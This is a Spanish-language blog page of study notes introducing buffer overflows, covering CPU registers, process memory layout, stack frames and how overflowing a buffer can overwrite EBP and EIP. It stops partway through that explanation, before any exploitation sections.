<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>7.BufferOverflow.</title>

  
  <meta name="author" content="Qv1nTv5">
  

  <meta name="description" content="An introduction to Buffer Overflow.">

  

  

  
  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Home">
  <meta property="og:title" content="7.BufferOverflow.">
  <meta property="og:description" content="An introduction to Buffer Overflow.">

  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Qv1nTv5">
  <meta property="og:article:published_time" content="2022-11-02T00:00:00-04:00">
  <meta property="og:url" content="http://localhost:4000/2022-11-02-7.BufferOverflow/">
  <link rel="canonical" href="http://localhost:4000/2022-11-02-7.BufferOverflow/">
  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:site" content="@Qvintvs1">
  <meta name="twitter:creator" content="@Qvintvs1">

  <meta property="twitter:title" content="7.BufferOverflow.">
  <meta property="twitter:description" content="An introduction to Buffer Overflow.">

  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/Cpage">C</a>
                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
            </div>
          </li>
        
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
                  <a class="dropdown-item" href="/THMpage">Thm</a>
                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
                  <a class="dropdown-item" href="/REDESpage">Net</a>
                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
            </div>
          </li>
        
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "2. Constants and Literals in C.", \
          "category" : "C", \
          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
          "date"     : "December 10, 2024" \
        }, \
       \
        { \
          "title"    : "1. Basics of C", \
          "category" : "C", \
          "url"      : "/2024-12-02-1.BasicsOfC/", \
          "date"     : "December  2, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "DHA", \
          "url"      : "/2024-09-24-Dharma_Tutorial/", \
          "date"     : "September 24, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "fuzz", \
          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
          "date"     : "March 22, 2024" \
        }, \
       \
        { \
          "title"    : "Mi experiencia con el OSCP", \
          "category" : "pen", \
          "url"      : "/2023-11-19-PEN200_Experience/", \
          "date"     : "November 19, 2023" \
        }, \
       \
        { \
          "title"    : "Client Side", \
          "category" : "pen", \
          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
          "date"     : "November 17, 2023" \
        }, \
       \
        { \
          "title"    : "Deep Packet Tunneling", \
          "category" : "pen", \
          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
          "date"     : "November 16, 2023" \
        }, \
       \
        { \
          "title"    : "Report", \
          "category" : "pen", \
          "url"      : "/2023-11-15-15.Making_Reports/", \
          "date"     : "November 15, 2023" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "pen", \
          "url"      : "/2023-11-14-14.Metasploit/", \
          "date"     : "November 14, 2023" \
        }, \
       \
        { \
          "title"    : "Password Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-13-13.Password_Attacks/", \
          "date"     : "November 13, 2023" \
        }, \
       \
        { \
          "title"    : "Active Directory Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
          "date"     : "November 12, 2023" \
        }, \
       \
        { \
          "title"    : "Port Forwarding", \
          "category" : "pen", \
          "url"      : "/2023-11-11-11.Port_Forwarding/", \
          "date"     : "November 11, 2023" \
        }, \
       \
        { \
          "title"    : "Privilege Escalation", \
          "category" : "pen", \
          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
          "date"     : "November 10, 2023" \
        }, \
       \
        { \
          "title"    : "File Transfers", \
          "category" : "pen", \
          "url"      : "/2023-11-09-9.File_Tranfers/", \
          "date"     : "November  9, 2023" \
        }, \
       \
        { \
          "title"    : "Buffer Overflows", \
          "category" : "pen", \
          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
          "date"     : "November  8, 2023" \
        }, \
       \
        { \
          "title"    : "Vulnerability Scanning.", \
          "category" : "pen", \
          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
          "date"     : "November  7, 2023" \
        }, \
       \
        { \
          "title"    : "Information Gathering", \
          "category" : "pen", \
          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
          "date"     : "November  6, 2023" \
        }, \
       \
        { \
          "title"    : "Windows", \
          "category" : "pen", \
          "url"      : "/2023-11-05-5.Windows/", \
          "date"     : "November  5, 2023" \
        }, \
       \
        { \
          "title"    : "Networking", \
          "category" : "pen", \
          "url"      : "/2023-11-04-4.Networking/", \
          "date"     : "November  4, 2023" \
        }, \
       \
        { \
          "title"    : "Scripting", \
          "category" : "pen", \
          "url"      : "/2023-11-03-3.Scripting/", \
          "date"     : "November  3, 2023" \
        }, \
       \
        { \
          "title"    : "Practical Tools", \
          "category" : "pen", \
          "url"      : "/2023-11-02-2.PracticalTools/", \
          "date"     : "November  2, 2023" \
        }, \
       \
        { \
          "title"    : "Linux", \
          "category" : "pen", \
          "url"      : "/2023-11-01-1.Linux/", \
          "date"     : "November  1, 2023" \
        }, \
       \
        { \
          "title"    : "Easy", \
          "category" : "hack", \
          "url"      : "/2022-12-01-Easy/", \
          "date"     : "December  1, 2022" \
        }, \
       \
        { \
          "title"    : "Git Basics", \
          "category" : "", \
          "url"      : "/2022-11-17-GitBasics/", \
          "date"     : "November 17, 2022" \
        }, \
       \
        { \
          "title"    : "Tier I", \
          "category" : "hack", \
          "url"      : "/2022-11-10-Tier_1/", \
          "date"     : "November 10, 2022" \
        }, \
       \
        { \
          "title"    : "Tier 0", \
          "category" : "hack", \
          "url"      : "/2022-11-09-Tier_0/", \
          "date"     : "November  9, 2022" \
        }, \
       \
        { \
          "title"    : "7.BufferOverflow.", \
          "category" : "thm", \
          "url"      : "/2022-11-02-7.BufferOverflow/", \
          "date"     : "November  2, 2022" \
        }, \
       \
        { \
          "title"    : "6.Offensive Pentesting", \
          "category" : "thm", \
          "url"      : "/2022-11-01-6.OffensivePentesting/", \
          "date"     : "November  1, 2022" \
        }, \
       \
        { \
          "title"    : "5.RedTeam", \
          "category" : "thm", \
          "url"      : "/2022-10-30-5.RedTeam/", \
          "date"     : "October 30, 2022" \
        }, \
       \
        { \
          "title"    : "4.Windows", \
          "category" : "thm", \
          "url"      : "/2022-10-22-4.Windows/", \
          "date"     : "October 22, 2022" \
        }, \
       \
        { \
          "title"    : "3.Junior Penetrationtester path", \
          "category" : "thm", \
          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
          "date"     : "September  2, 2022" \
        }, \
       \
        { \
          "title"    : "2.Complete Begginer path.", \
          "category" : "thm", \
          "url"      : "/2022-08-07-2.CompleteBegginer/", \
          "date"     : "August  7, 2022" \
        }, \
       \
        { \
          "title"    : "1.Pre-Security path.", \
          "category" : "thm", \
          "url"      : "/2022-07-11-1Pre-Security/", \
          "date"     : "July 11, 2022" \
        }, \
       \
        { \
          "title"    : "0.Scripting for pentesters.", \
          "category" : "thm", \
          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
          "date"     : "July 10, 2022" \
        }, \
       \
        { \
          "title"    : "Burp Certified Practitioner Practice Exam.", \
          "category" : "burp", \
          "url"      : "/2022-03-30-PracticeExam/", \
          "date"     : "March 30, 2022" \
        }, \
       \
        { \
          "title"    : "22. OAuth Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-27-22.OAuth_authentication/", \
          "date"     : "March 27, 2022" \
        }, \
       \
        { \
          "title"    : "21. HTTP Request Smuggling.", \
          "category" : "burp", \
          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
          "date"     : "March 26, 2022" \
        }, \
       \
        { \
          "title"    : "20. HTTP Host Header Attacks.", \
          "category" : "burp", \
          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
          "date"     : "March 25, 2022" \
        }, \
       \
        { \
          "title"    : "19. Web Cache Poisoning.", \
          "category" : "burp", \
          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
          "date"     : "March 24, 2022" \
        }, \
       \
        { \
          "title"    : "18. Server-Side Template Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
          "date"     : "March 23, 2022" \
        }, \
       \
        { \
          "title"    : "17. Insecure Deserialization.", \
          "category" : "burp", \
          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
          "date"     : "March 22, 2022" \
        }, \
       \
        { \
          "title"    : "16. WebSockets.", \
          "category" : "burp", \
          "url"      : "/2022-03-21-16.WebSockets/", \
          "date"     : "March 21, 2022" \
        }, \
       \
        { \
          "title"    : "15.DOM-based XSS vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
          "date"     : "March 20, 2022" \
        }, \
       \
        { \
          "title"    : "14. Clickjacking.", \
          "category" : "burp", \
          "url"      : "/2022-03-19-14.Clickjacking/", \
          "date"     : "March 19, 2022" \
        }, \
       \
        { \
          "title"    : "13. Cross-Origin Resource Sharing.", \
          "category" : "burp", \
          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
          "date"     : "March 18, 2022" \
        }, \
       \
        { \
          "title"    : "12. Cross-Site Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
          "date"     : "March 17, 2022" \
        }, \
       \
        { \
          "title"    : "11. Cross-Site Scripting.", \
          "category" : "burp", \
          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
          "date"     : "March 16, 2022" \
        }, \
       \
        { \
          "title"    : "10. XXE Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-15-10.XXE_injection/", \
          "date"     : "March 15, 2022" \
        }, \
       \
        { \
          "title"    : "9. Server-Side Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
          "date"     : "March 14, 2022" \
        }, \
       \
        { \
          "title"    : "8. File Upload.", \
          "category" : "burp", \
          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
          "date"     : "March 13, 2022" \
        }, \
       \
        { \
          "title"    : "7. Access Control.", \
          "category" : "burp", \
          "url"      : "/2022-03-12-7.Access_control/", \
          "date"     : "March 12, 2022" \
        }, \
       \
        { \
          "title"    : "6. Information Disclosure.", \
          "category" : "burp", \
          "url"      : "/2022-03-11-6.Information_disclosure/", \
          "date"     : "March 11, 2022" \
        }, \
       \
        { \
          "title"    : "5. Bussiness Logic Vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
          "date"     : "March 10, 2022" \
        }, \
       \
        { \
          "title"    : "4. Command Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-09-4.Command_Injection/", \
          "date"     : "March  9, 2022" \
        }, \
       \
        { \
          "title"    : "3. Directory Traversal.", \
          "category" : "burp", \
          "url"      : "/2022-03-08-3.Directory_Traversal/", \
          "date"     : "March  8, 2022" \
        }, \
       \
        { \
          "title"    : "2. Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-07-2.Authentication/", \
          "date"     : "March  7, 2022" \
        }, \
       \
        { \
          "title"    : "1. SQLInjection", \
          "category" : "burp", \
          "url"      : "/2022-03-06-1.SQLInjection/", \
          "date"     : "March  6, 2022" \
        }, \
       \
        { \
          "title"    : "Seguridad Perimetral", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Hardening de sistemas", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Bandit", \
          "category" : "otw", \
          "url"      : "/2022-02-08-Bandit/", \
          "date"     : "February  8, 2022" \
        }, \
       \
        { \
          "title"    : "Proxy", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Proxys/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Protocolos Relevantes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Protocolos_Importantes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Curso Básico Redes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Precurso_Redes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "IPs", \
          "category" : "redes", \
          "url"      : "/2022-02-07-IPs/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Movimientos Laterales", \
          "category" : "redteam", \
          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
          "date"     : "February  6, 2022" \
        }, \
       \
        { \
          "title"    : "Evasión de Defensas", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Escalada de privilegios", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "redteam", \
          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
          "date"     : "February  4, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a aplicaciones Android", \
          "category" : "redteam", \
          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
          "date"     : "February  3, 2022" \
        }, \
       \
        { \
          "title"    : "Ataque a aplicaciones web.", \
          "category" : "redteam", \
          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
          "date"     : "February  2, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a Infraestructuras y Redes", \
          "category" : "redteam", \
          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
          "date"     : "February  1, 2022" \
        }, \
       \
        { \
          "title"    : "Análisis de Objetivos", \
          "category" : "redteam", \
          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
          "date"     : "January 28, 2022" \
        }, \
       \
       \
        { \
          "title"    : "Blueteam Basics", \
          "category" : "page", \
          "url"      : "/BLUETEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PortSwigger BurpSuite Course", \
          "category" : "page", \
          "url"      : "/BURPSUITEpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "C programming subjects.", \
          "category" : "page", \
          "url"      : "/Cpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Dharma Fuzzer language", \
          "category" : "page", \
          "url"      : "/DHARMApage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Exploiting &amp; Reversing", \
          "category" : "page", \
          "url"      : "/EXPREVpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Fuzzing JavaScript Engine", \
          "category" : "page", \
          "url"      : "/Fuzzpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "HackTheBox", \
          "category" : "page", \
          "url"      : "/HackTheBoxpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PEN200 notes", \
          "category" : "page", \
          "url"      : "/PEN200page/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Proyectos", \
          "category" : "page", \
          "url"      : "/PROJECTSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Networking Basics", \
          "category" : "page", \
          "url"      : "/REDESpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "RedTeam Basics", \
          "category" : "page", \
          "url"      : "/REDTEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Retired Machines", \
          "category" : "page", \
          "url"      : "/RetiredMachinespage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "TryHackMe", \
          "category" : "page", \
          "url"      : "/THMpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "About me", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "THM", \
          "category" : "page", \
          "url"      : "/preOSCPpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page2/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page3/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page4/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page5/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page6/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page7/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page8/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page9/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page10/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page11/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page12/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page13/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page14/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page15/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>7.BufferOverflow.</h1>
          
            
              <h2 class="post-subheading">An introduction to Buffer Overflow.</h2>
            
          

          
            <span class="post-meta">Posted on November 2, 2022</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <h2 id="0-índice">0. Índice.</h2>

<ul>
  <li>1 Presentación del material.</li>
  <li>2 BufferOverFlow Explained.</li>
  <li>3 Python3.</li>
  <li>4 Tryhackme’s BufferOverflow.</li>
</ul>

<h3 id="1-presentación-del-material">1. Presentación del material.</h3>

<p>Estos son unos apuntes construidos a partir del siguiente <a href="https://www.youtube.com/watch?v=ncBblM920jw&amp;t=151s&amp;ab_channel=TheCyberMentor">vídeo</a>. y de la siguiente <a href="https://payatu.com/understanding-stack-based-buffer-overflow">página</a></p>

<p>Para la realización de los mismos se ha utilizado:</p>

<ul>
  <li>Máquina Windows 10 hosteada virtualmente (Virtualbox).</li>
  <li><a href="https://www.youtube.com/watch?v=ncBblM920jw&amp;t=151s&amp;ab_channel=TheCyberMentor">Vulnserver</a></li>
  <li><a href="https://www.youtube.com/watch?v=ncBblM920jw&amp;t=151s&amp;ab_channel=TheCyberMentor">Inmunity Debugger</a></li>
</ul>

<p><br /></p>

<h3 id="2-bufferoverflow-explained">2. BufferOverFlow Explained.</h3>

<h4 id="21-memory-fundamentals">2.1. Memory Fundamentals.</h4>

<p><strong>Registers</strong></p>

<p><em>Memoria</em> es el término utilizado para hablar de una herramienta empleada para guardar datos de rápido acceso asociados a un programa que se está ejecutando, un proceso. Cuando un programa se ejecuta se forma un proceso que corre gracias a que pueden guardarse datos asociados al mismo (como el código a ejecutar, espacio para funciones, etc) en memoria de forma que el procesador tiene rápido acceso a los mismos.</p>

<p>Uno de los tipos de los dispositivos de memoria que nos interesa estudiar son los <em>CPU Registers</em>. Estos son localizaciones de memoria de muy rápido acceso para el procesador en el que se aloja información utilizada de forma frecuente por el mismo. Existen muchos de diversos tipos en función de su propósito aunque a nosotros nos interesan los siguientes:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221017165427.png" text-align="center" />
</div>

<ul>
  <li><em>Acumulador</em>: Empleado en operaciones aritméticas.</li>
  <li><em>Counter</em>: Usado en bucles o instrucciones de rotación.</li>
  <li><em>Data</em>: Usado en operaciones de Input/Output y también en operaciones aritméticas.</li>
  <li><em>Base</em>: Registro empleado a modo de puntero, que apunta al ‘data’.</li>
  <li><em>Stack Pointer</em>: Usado como puntero que apunta al <em>top</em> del stack (esto se entenderá más adelante).</li>
  <li><em>Stack Base Pointer</em>: Usado como puntero que apunta al <em>base</em> del stack.</li>
  <li><em>Source</em>: Apunta a la fuente (source) en ‘stream operations’.</li>
  <li><em>Destination</em>: Apunta al destino en ‘stream operations’.</li>
</ul>

<p>Otros registros también incluyen:</p>

<ul>
  <li><em>Flag Register</em>: Empleado en funciones aritméticas y debugging.</li>
  <li><em>Segment Registers</em>: Empleados como punteros que apuntan a segmentos concretos de memoria.</li>
  <li><em>Instruction Register</em>: Apunta a la dirección de la siguiente instrucción assembly en ser ejecutada.</li>
</ul>

<p><br /></p>

<p><strong>Memory Structure</strong></p>

<p>Como hemos dicho, la memoria es una herramienta que guarda datos asociados a procesos. Esta está constituida por direcciones de memoria ordenadas. Estas a su vez se organizan por rangos con diferentes propósitos tal y como se puede ver en la imagen:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221017173638.png" text-align="center" />
</div>

<ul>
  <li><em>Text</em>: Contiene un mapeo en memoria del ejecutable que inicia el proceso (imagen) en binario.</li>
  <li><em>Data</em>: Variables globales y estáticas inicializadas.</li>
  <li><em>BSS</em>: Variables globales y estáticas no inicializadas.</li>
  <li><em>Heap</em>: Variables dinámicamente alojadas.</li>
  <li><em>Memory Mapping</em>: Mapeo de ficheros auxiliares como librerias.</li>
  <li><em>Stack</em>: Parámetros y variables locales de cada <em>thread</em>. (Ver Windows Internals).</li>
  <li><em>Kernel Spacel</em>: Reservados para funciones del kernel.</li>
</ul>

<p><br /></p>

<p><strong>Stack Structure</strong></p>

<p>A su vez, la región asociada al <em>stack</em> está compuesto por rangos de memorias denominadas como <em>stack frames</em> asociadas a un determinado proceso o función en el código del ejecutable que se está procesando. El stack funciona en la métodología “last in - fist out”, esto es, el último elemento que se añade a la pila es el primero que sale antes de que salgan los restantes elementos que integran el Stack:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221018120233.png" text-align="center" />
</div>

<p>Los <em>stack frames</em> son elementos de memoria que trabajan sobre un mismo proceso o función, en más detalle podemos ver por ejemplo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221018120650.png" text-align="center" />
</div>

<p>Que el stack contiene 3 stackframes, y cada stack frame contiene una serie de instrucciones que refieren al mismo proceso. Estos stack frames están compuestos por los mismos elementos:</p>

<ul>
  <li>En primer lugar tenemos las variables que serán declaradas dentro de la función.</li>
  <li>El puntero EBP que apunta directamente a la base del stackframe.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221018121723.png" text-align="center" />
</div>

<ul>
  <li>La instrucción return o EIP (Extended Instruction Pointer), que salta (popea) nada más terminar la función de procesarse para apuntar a la siguiente instrucción a ser ejecutada.</li>
  <li>Los parámetros junto con los cuales se ha llamado a la función.</li>
</ul>

<p>Así, supongámos que tenemos la siguiente pieza de código escrito en C:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221018122030.png" text-align="center" />
</div>

<p>Su análogo en la estructura del stack sería:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221018122112.png" text-align="center" />
</div>

<p>Podemos observar que los datos se acumulan en el stack a medida que el código se va procesando y que la metodología ‘Last-In First-Out’</p>

<p><br /></p>

<p><br /></p>

<h4 id="22-buffer-overflows-made-easy">2.2. Buffer Overflows Made Easy.</h4>

<p><strong>Anatomy of Memory</strong></p>

<p>Como hemos indicado, la memoria consiste en un conjunto de direcciones ordenadas numéricamente de forma que van desde menor o el ‘bottom’ de la memoria al mayor valor o ‘top’ de la memoria:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019093501.png" text-align="center" />
</div>

<p>Nos concentraremos sobre todo en la parte de la memoria denominada como el ‘stack’, echando un vistazo más de cerca el Stack contiene las siguientes partes tal y como hemos visto en la sección anterior:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019093807.png" text-align="center" />
</div>

<ul>
  <li><em>ESP (Extended Stack Pointer)</em>: Se trata de un puntero que apunta a la cima del stackframe.</li>
  <li><em>Buffer Space</em>: En el que se almacenan las variables que se declaran dentro de la función a la que está asociada el stack frame.</li>
  <li><em>EBP (Extended Base Pointer)</em>: Se trata de un puntero que apunta a la base del stackframe.</li>
  <li><em>EIP (Extended Instruction Pointer)</em>: Se trata de un puntero que apunta a la siguiente instrucción a ser ejecutada.</li>
</ul>

<p><br /></p>

<p><strong>Buffer Space Overflow</strong></p>

<p>Concretamente lo que nos interesa es la parte del stack denominada ‘Buffer Space’ que contiene los datos asociados al interior de la función de que se está procesando en dicho stackframe. En un sentido técnico, <em>el Buffer Overflow consiste en una malconfiguración que permite la sobreescritura de otras partes del stack (EIP) induciendo al procesador a la ejecución de código malicoso</em>.</p>

<p>En un contexto normal, el desbordamiento de contenido se maneja correctamente e impide que el contenido por exceso pase a direcciones de memoria ajenas al Buffer Space y pertenencientes a otras secciones del stack.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019101209.png" text-align="center" />
</div>

<p>Sin embargo, si esto no se prepara adecuadamente, el exceso de datos pasa a ocupar direcciones de memoria dentro del rango asociado al EBP y posteriormente a el EIP:</p>

